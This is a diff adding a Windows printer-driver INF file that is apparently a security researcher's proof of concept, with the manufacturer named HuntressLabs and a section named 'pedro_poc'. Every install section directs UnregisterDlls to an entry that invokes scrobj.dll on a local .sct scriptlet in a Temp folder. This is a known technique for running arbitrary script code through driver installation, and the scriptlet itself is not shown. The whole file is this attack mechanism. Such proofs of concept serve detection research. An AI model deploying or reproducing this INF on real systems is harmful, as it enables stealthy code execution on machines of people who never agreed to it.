@@ -1,0 +1,31 @@
+; ----------------------------------------------------------------------
+; Required Sections
+; ----------------------------------------------------------------------
+[Version] 
+Signature=$CHICAGO$
+Provider=test
+Class=Printer
+
+[Manufacturer]
+HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64
+
+; ----------------------------------------------------------------------
+; Models Section
+; ----------------------------------------------------------------------
+[ModelsSection.NTx86]
+UnregisterDlls = pedro_poc
+
+[ModelsSection.NTia64]
+UnregisterDlls = pedro_poc
+
+[ModelsSection.NTamd64]
+UnregisterDlls = pedro_poc
+
+; ----------------------------------------------------------------------
+; Support Sections
+; ----------------------------------------------------------------------
+[DefaultInstall]
+UnregisterDlls = pedro_poc
+
+[pedro_poc]
+11,,scrobj.dll,2,60,C:\Users\Administrador\AppData\Local\Temp\TCD172B.tmp\Demo2_sct\demo_sct.sct
